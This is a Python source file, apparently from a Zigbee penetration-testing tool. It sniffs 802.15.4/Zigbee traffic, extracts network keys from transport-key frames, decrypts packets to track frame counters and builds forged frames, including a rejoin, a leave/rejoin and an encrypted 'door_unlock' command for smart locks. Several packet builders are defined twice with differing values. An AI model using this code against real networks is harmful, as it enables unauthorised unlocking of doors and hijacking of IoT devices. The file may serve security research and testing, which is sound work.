from scapy.layers.dot15d4 import * 
from scapy.layers.zigbee import *
from killerbee.scapy_extensions import *
from zigdiggity.datastore.devices import Device
from zigdiggity.datastore.networks import Network
from zigdiggity.interface.colors import *
from zigdiggity.utils import crypto
import datetime

#
# Logic for setting packet information into our datasource
#
def add_to_datasource(packet, datasource, channel, ignore_seqnums=[], ignore_pans=[], ignore_addrs=[], ignore_epans=[], ignore_eaddrs=[]):

    # Source device
    epan = get_extended_pan(packet)
    epan = str(epan) if not epan is None else None
    addr = get_short_address(packet)
    pan = get_pan_id(packet)
    eaddr = get_full_address(packet)
    eaddr = str(eaddr) if not eaddr is None else None
    is_coord = get_is_coordinator(packet)
    seqnum = get_sequence_number(packet)

    add_to_datasource_no_packet(datasource, channel, seqnum, pan, addr, epan, eaddr, is_coord, ignore_seqnums, ignore_addrs, ignore_epans, ignore_eaddrs)
    network = find_network_in_datastore(datasource, channel, pan=pan, epan=epan)

    # Destination device
    addr = get_short_dest_address(packet)
    eaddr = get_full_dest_address(packet)
    eaddr = str(eaddr) if not eaddr is None else None

    add_to_datasource_no_packet(datasource, channel, seqnum, pan, addr, epan, eaddr, is_coord, ignore_seqnums, ignore_addrs, ignore_epans, ignore_eaddrs)

    if network is not None and network.nwk_key is not None:
        network_key = network.nwk_key.decode('hex')
    else:
        network_key = try_to_get_network_key(packet, datasource)
        if network_key is not None:
            add_network_key_to_datasource(packet, datasource, network_key, channel)

    # Once we have the network key, there are some nice attacks that require the counters
    if network_key is not None:
        # Attempt to store any sequence numbers seen
        extract_and_save_sequence_numbers(packet, datasource, network_key)

def extract_and_save_sequence_numbers(packet, datasource, network_key):


    pan = get_pan_id(packet)
    addr = get_short_address(packet)
    epan = get_extended_pan(packet)
    eaddr = get_full_address(packet)

    if eaddr is not None:
        device = datasource.query(Device).filter_by(extended_address=str(eaddr)).first()
    elif epan is not None and addr is not None:
        device = datasource.query(Device).filter_by(extended_pan_id=str(epan), address=addr).first()
    elif pan is not None and addr is not None:
        device = datasource.query(Device).filter_by(pan_id=pan, address=addr).first()
    else:
        return # We can't add sequence numbers to an unknown device

    # Extract the ones from unencrypted data parts
    d15d4_number = get_sequence_number(packet)
    nwk_number = get_nwk_sequence(packet)
    frame_counter = get_frame_counter(packet)
    if d15d4_number is not None:
        device.d15d4_sequence_number = d15d4_number
    if nwk_number is not None:
        device.nwk_sequence_number = nwk_number
    if frame_counter is not None:
        device.frame_counter = frame_counter

    
    if ZigbeeSecurityHeader in packet and device.extended_address is not None:

        packet[ZigbeeSecurityHeader].source = long(device.extended_address)
        packet[ZigbeeNWK].ext_src = long(device.extended_address)
        # Decrypted data
        payload = kbdecrypt(packet, network_key)

        if payload is not None:
            aps_counter = get_aps_counter(payload)
            zcl_number = get_zcl_sequence(payload)

            if aps_counter is not None:
                device.aps_counter = aps_counter
            if zcl_number is not None:
                device.zcl_sequence_number = zcl_number

    # Save the new data
    datasource.commit()

def add_to_datasource_no_packet(datasource, channel, seqnum=None, pan=None, addr=None, epan=None, eaddr=None, is_coord=None, ignore_seqnums=[], ignore_pans=[], ignore_addrs=[], ignore_epans=[], ignore_eaddrs=[]):

    new_device = False
    new_network = False
   

    # Broadcast PANs tell us nothing about the device's PAN id
    if pan == 0xffff or pan == 0xfffc:
        pan = None 

    # Broadcast address tells us nothing about the device's address
    if addr == 0xffff:
        addr = None

    if epan in ignore_epans or pan in ignore_pans or addr in ignore_addrs or eaddr in ignore_eaddrs or seqnum in ignore_seqnums:
        return

    if channel is None or (channel < 11 or channel > 25):
        Color.pl("{!} Attempting to modify the datastore without a channel")
        return

    if not is_probably_device(pan=pan, addr=addr, epan=epan, eaddr=eaddr):
        return

    device = find_device_in_datastore(datasource, channel, pan=pan, addr=addr, epan=epan, eaddr=eaddr)
    if device is None:
        device = Device()
        new_device = True
    else:
        check_for_duplicates_in_datastore(datasource, device, channel, pan, addr, epan, eaddr)

    # Keeping track of some data so we can remove records that are duplicates

    device.channel = channel
    device.pan_id = (pan if not pan is None else device.pan_id)
    device.address = (addr if not addr is None else device.address)
    device.extended_pan_id = (epan if not epan is None else device.extended_pan_id)
    device.extended_address = (eaddr if not eaddr is None else device.extended_address)
    device.is_coordinator = (is_coord if not is_coord is None else device.is_coordinator)
    device.last_updated = datetime.datetime.utcnow()

    network = find_network_in_datastore(datasource, channel, pan=pan, epan=epan)
    if network is None:
        if not pan is None and not epan is None:
            network = Network(channel=channel, pan_id=pan, extended_pan_id=epan, last_updated=datetime.datetime.utcnow())
            datasource.add(network)
    else:
        network.last_updated = datetime.datetime.utcnow()
        if device.extended_pan_id is None:
            device.extended_pan_id = network.extended_pan_id

    if new_device:
        datasource.add(device)

    datasource.commit()

def add_network_key_to_datasource(packet, datasource, network_key, channel):
    pan = get_pan_id(packet)
    epan = get_extended_pan(packet)
    if epan is not None:
        network = datasource.query(Network).filter_by(extended_pan_id=epan, pan_id=pan).first()
    else:
        network = datasource.query(Network).filter_by(pan_id=pan).first()
    if network is None:
        print "ERROR: FOUND A NETWORK KEY FOR A NON-EXISTENT NETWORK"
        network = Network()
        network.pan_id = pan
        datasource.add(network)
    network.nwk_key = network_key.encode('hex')

    datasource.commit()

def check_for_duplicates_in_datastore(datasource, device, channel, pan=None, addr=None, epan=None, eaddr=None):

    # We check two case, 
    for i in range(2):
        if i ==0:
            duplicate_check = find_device_in_datastore(datasource, channel, pan=pan, addr=addr, epan=epan, eaddr=None)
        elif i==1:
            duplicate_check = find_device_in_datastore(datasource, channel, pan=pan, addr=addr, epan=None, eaddr=eaddr)
    
        # print "DUPLICATE: %s" % duplicate_check
        if (not device is None and not duplicate_check is None and device.id != duplicate_check.id):
            if device.pan_id is None:
                device.pan_id = duplicate_check.pan_id
            if device.extended_pan_id is None:
                device.extended_pan_id = duplicate_check.extended_pan_id
            if device.address is None:
                device.address = duplicate_check.address
            if device.extended_address is None:
                device.extended_address = duplicate_check.address
            datasource.delete(duplicate_check)
    
    datasource.commit()


#
# Tries to see if the network already exists in our network list
#
def find_network_in_datastore(datasource, channel, pan=None, epan=None):
    
    if epan is None:
        return datasource.query(Network).filter_by(channel=channel, pan_id=pan).first()
    else:
        return datasource.query(Network).filter_by(channel=channel, pan_id=pan, extended_pan_id=epan).first()

# Searches for devices in the datastore, uses the most reliable indicators first
# 
# Search order is as follows:
#       Extended Address (unique per device)
#       Extended PAN and Short Address
#       Short PAN and Short Address
#
def find_device_in_datastore(datasource, channel, pan=None, addr=None, epan=None, eaddr=None):

    # First check for the extended address (ignore the channel for this one)
    if not eaddr is None:

        device_by_eaddr = datasource.query(Device).filter_by(channel=channel, extended_address=eaddr).first()
        if not device_by_eaddr is None:
            return device_by_eaddr

    # I don't know why this case would happen, but if it does, we'll use it
    if not epan is None and not addr is None:

        device_by_epan_addr = datasource.query(Device).filter_by(channel=channel, extended_pan_id=epan, address=addr).first()
        if not device_by_epan_addr is None:
            return device_by_epan_addr

    # Check if we have even the smallest amount of identifying data
    if not pan is None and not addr is None:

        # Try to find the device
        device_by_pan_addr = datasource.query(Device).filter_by(channel=channel, pan_id=pan, address=addr).first()
        
        # if it isn't there, search harder
        if device_by_pan_addr is None:
            if epan is None:
                # We don't have the epan, so we'll see if we know what epan is related to the PAN id
                network = datasource.query(Network).filter_by(channel=channel, pan_id=pan).first()
                if not network is None:
                    epan = network.extended_pan_id

            if not epan is None:
                # Check to see if we have a device by that address in the same epan
                device_by_epan_addr = datasource.query(Device).filter_by(channel=channel, extended_pan_id=epan, address=addr).first()
                if not device_by_epan_addr is None:
                    # device found by epan and address, return the device
                    return device_by_epan_addr
        else:
            return device_by_pan_addr

    return None
                

#
# Utility functions
#
def src_panid_present(packet):
    if Dot15d4FCS in packet:
        return packet.fcf_srcaddrmode != 0 and packet.fcf_panidcompress == 0
    else:
        return False

def is_probably_device(pan=None, addr=None, epan=None, eaddr=None):
    if not eaddr is None:
        return True
    elif not pan is None and not addr is None:
        return True
    elif not epan is None and not addr is None:
        return True
    return False

#
# Logic checking or extracting form packets
# 

def is_beacon_response(packet):
    return ZigBeeBeacon in packet

def try_to_get_network_key(packet, datasource):

    if ZigbeeSecurityHeader in packet:
        # check if it is using the transport key
        if packet[ZigbeeSecurityHeader].key_type == 2:
            if get_full_address(packet) is None:
                addr = get_short_address(packet)
                pan = get_pan_id(packet)
                # Check the database
                device = datasource.query(Device).filter_by(address=addr, pan_id=pan).first()
                if device is not None:
                    extended_source = device.extended_address
            else:
                extended_source = get_full_address(packet)
            if extended_source is None:
                return None
            return crypto.extract_network_key(packet, long(extended_source))

def get_sequence_number(packet):
    if Dot15d4FCS in packet:
        return packet[Dot15d4FCS].seqnum
    return None

def get_nwk_sequence(packet):
    if ZigbeeNWK in packet:
        return packet[ZigbeeNWK].seqnum
    return None

def get_frame_counter(packet):
    if ZigbeeSecurityHeader in packet:
        return packet[ZigbeeSecurityHeader].fc
    return None

def get_aps_counter(packet):
    if ZigbeeAppDataPayload in packet:
        return packet[ZigbeeAppDataPayload].counter
    return None

def get_zcl_sequence(packet):
    if ZigbeeClusterLibrary in packet:
        return packet[ZigbeeClusterLibrary].transaction_sequence
    return None

def get_extended_pan(packet):
    if ZigBeeBeacon in packet:
        return packet[ZigBeeBeacon].extended_pan_id
    return None

def get_short_address(packet):
    if Dot15d4FCS in packet:
        if packet[Dot15d4FCS].fcf_srcaddrmode == 2: # Short
            if Dot15d4Data in packet:
                return packet[Dot15d4Data].src_addr
            elif Dot15d4Cmd in packet:
                return packet[Dot15d4Cmd].src_addr
            elif Dot15d4Beacon in packet:
                return packet[Dot15d4Beacon].src_addr
    return None

def get_short_dest_address(packet):
    if Dot15d4FCS in packet:
        if packet[Dot15d4FCS].fcf_destaddrmode == 2: # Short
            if Dot15d4Data in packet:
                return packet[Dot15d4Data].dest_addr
            elif Dot15d4Cmd in packet:
                return packet[Dot15d4Cmd].dest_addr
    return None

def get_pan_id(packet):
    if Dot15d4FCS in packet:
        if Dot15d4Data in packet:
            if src_panid_present(packet):
                return packet[Dot15d4Data].src_panid
            else:
                return packet[Dot15d4Data].dest_panid
        elif Dot15d4Cmd in packet:
            if src_panid_present(packet):
                return packet[Dot15d4Cmd].src_panid
            else:
                return packet[Dot15d4Cmd].dest_panid
        elif Dot15d4Beacon in packet:
            return packet[Dot15d4Beacon].src_panid
    return None

def get_extended_pan(packet):
    if ZigBeeBeacon in packet:
        return packet[ZigBeeBeacon].extended_pan_id

def get_full_address(packet):
    if ZigbeeNWK in packet:
        if packet[ZigbeeNWK].flags & 16: # Extended source
            return packet[ZigbeeNWK].ext_src
    if ZigbeeSecurityHeader in packet:
        return packet[ZigbeeSecurityHeader].source
    return None

def get_full_dest_address(packet):
    if ZigbeeNWK in packet:
        if packet[ZigbeeNWK].flags & 8: # Extended dest
            return packet[ZigbeeNWK].ext_dst
    return None

def get_is_coordinator(packet):
    if Dot15d4Beacon in packet:
        return packet[Dot15d4Beacon].sf_pancoord
    return None


#
# Actual packets, the actual implementation is a bit messy. Sorry for that.
#

def ack(seq_num=0):
    return Dot15d4FCS(fcf_frametype=2, seqnum=seq_num)


def beacon_request(seq_num=0):
    return Dot15d4FCS(fcf_frametype=3, fcf_destaddrmode=2, seqnum=seq_num) / Dot15d4Cmd(cmd_id=7)

def beacon_response(pan_id, source=0x0000, extended_panid=0x0102030405060708, seq_num=0):
    beacon_payload = [
            "\x00", # Proto 0
            "\x22\x84", # Beacon Stack Profile
            str(struct.pack("Q",extended_panid)),
            "\xff\xff\xff", # TX Offset
            "\xff" # Update ID
    ]
    return Dot15d4FCS(str(Dot15d4(fcf_frametype=0, fcf_srcaddrmode=2, fcf_destaddrmode=0, seqnum=seq_num) / Dot15d4Beacon(src_panid=pan_id, src_addr=source, sf_pancoord=1)) + ''.join(beacon_payload))

def ack(seq_num=0):
    return Dot15d4(fcf_frametype=2, seqnum=seq_num)


def beacon_request(seq_num=0):
    return Dot15d4(fcf_frametype=3, fcf_destaddrmode=2, seqnum=seq_num) / Dot15d4Cmd(cmd_id=7)

def beacon_response(pan_id, source=0x0000, extended_panid=0x0102030405060708, seq_num=55):
    beacon_payload = [
            "\x00", # Proto 0
            "\x22\x8c", # Beacon Stack Profile
            str(struct.pack("Q",extended_panid)),
            "\xff\xff\xff", # TX Offset
            "\x00" # Update ID
    ]
    return Dot15d4(str(Dot15d4(fcf_frametype=0, fcf_srcaddrmode=2, fcf_destaddrmode=0, seqnum=seq_num) / Dot15d4Beacon(src_panid=pan_id, src_addr=source, sf_pancoord=1, sf_assocpermit=1)) + ''.join(beacon_payload))

def data_request(source, destination, pan_id, seq_num=0):
    return Dot15d4(fcf_frametype=3, fcf_srcaddrmode=2, fcf_destaddrmode=2, fcf_ackreq=1, fcf_panidcompress=1, seqnum=seq_num) / Dot15d4Cmd(cmd_id=4, dest_panid=pan_id, dest_addr=destination, src_addr=source)

def insecure_rejoin(source, destination, pan_id, extended_source, seq_num=0):
    return Dot15d4(fcf_frametype=1, fcf_destaddrmode=2, fcf_srcaddrmode=2, fcf_panidcompress=1, fcf_ackreq=1, seqnum=seq_num) / Dot15d4Data(dest_addr=destination, src_addr=source, dest_panid=pan_id) / ZigbeeNWK(frametype=1, proto_version=2, flags=['extended_src'], ext_src=extended_source, source=source, radius=1) / ZigbeeNWKCommandPayload(cmd_identifier=6, allocate_address=1)

def link_status_unencrypted(source, pan_id, extended_source, seq_num=0, zb_seq_num=0):
    return Dot15d4(fcf_frametype=1, fcf_destaddrmode=2, fcf_srcaddrmode=2, fcf_panidcompress=1, fcf_ackreq=1, seqnum=seq_num) / Dot15d4Data(dest_addr=0xffff, src_addr=source, dest_panid=pan_id) / ZigbeeNWK(frametype=1, proto_version=2, flags=['extended_src'], ext_src=extended_source, source=source, destination=0xfffc, radius=1, seqnum=zb_seq_num) / ZigbeeNWKCommandPayload(cmd_identifier=8, first_frame=1, last_frame=1, entry_count=0)

def leave_rejoin(source, destination, pan_id, extended_source, key, seq_num=0, zb_seq_num=0, frame_counter=10001):
    payload = ZigbeeNWKCommandPayload(cmd_identifier=4, rejoin=1, request=1)
    pkt = Dot15d4(fcf_frametype=1, fcf_destaddrmode=2, fcf_srcaddrmode=2, fcf_panidcompress=1, fcf_ackreq=1, seqnum=seq_num) / Dot15d4Data(dest_addr=destination, src_addr=source, dest_panid=pan_id) / ZigbeeNWK(frametype=1, proto_version=2, flags=0x12, ext_src=extended_source, source=source, destination=destination, radius=1, seqnum=seq_num) / ZigbeeSecurityHeader(extended_nonce=1, key_type=1, fc=frame_counter, source=extended_source, key_seqnum=0)
    return kbencrypt(pkt, payload, key)

def aps_ack(d15d4_seqnum=0, d15d4_source=0x0000, d15d4_destination=0x0000, d15d4_pan=0x0000, nwk_seqnum=0, nwk_source=0x0000, nwk_destination=0x0000, aps_counter=0, aps_source=1, aps_destination=1, aps_cluster=0x0501, aps_profile=0x0104, frame_counter=10001, security=True, key="AAAAAAAAAAAAAAAA", extended_source="0102030405060708"):
    if security:
        payload = ZigbeeAppDataPayload(frame_control=0, aps_frametype=2, dst_endpoint=aps_destination, src_endpoint=aps_source, cluster=aps_cluster, profile=aps_profile, counter=aps_counter)

        pkt = Dot15d4(fcf_frametype=1, fcf_ackreq=1, fcf_panidcompress=1, fcf_srcaddrmode=2, fcf_destaddrmode=2, seqnum=d15d4_seqnum) / Dot15d4Data(dest_addr=d15d4_destination, src_addr=d15d4_source, dest_panid=d15d4_pan) / ZigbeeNWK(frametype=0, proto_version=2, discover_route=1, flags=2, destination=nwk_destination, source=nwk_source, radius=30, seqnum=nwk_seqnum) / ZigbeeSecurityHeader(extended_nonce=1,  key_type=1, fc=frame_counter, source=extended_source, key_seqnum=0)

        return kbencrypt(pkt, payload, key)

def door_unlock(source, destination, pan, extended_source, encr_key, frame_counter=0x000fffff, seq_num=1, nwk_seq=1, aps_counter=1, zcl_seq=1):
    if extended_source is None:
        extended_source = 0x1234
    if frame_counter is None:
        frame_counter = 0x000fffff
    if seq_num is None:
        seq_num = 1
    if aps_counter is None:
        aps_counter = 1
    if zcl_seq is None:
        zcl_seq=1        
    payload = ZigbeeAppDataPayload(str(ZigbeeAppDataPayload(frame_control=0x4, aps_frametype=0, dst_endpoint=2, src_endpoint=1, cluster=0x0101, profile=0x0104, counter=aps_counter)) + "\x01%s\x01" % struct.pack('B',zcl_seq))
    packet = Dot15d4(fcf_frametype=1, fcf_ackreq=1, fcf_panidcompress=1, fcf_srcaddrmode=2, fcf_destaddrmode=2, seqnum=seq_num) / \
            Dot15d4Data(dest_addr=destination, src_addr=source, dest_panid=pan) / \
            ZigbeeNWK(frametype=0, proto_version=2, discover_route=1, flags=2, destination=destination, source=source, radius=30, seqnum=seq_num) / \
            ZigbeeSecurityHeader(extended_nonce=1, key_type=1, fc=frame_counter, source=extended_source, key_seqnum=0)
    after = kbencrypt(packet, payload, encr_key)
    return after
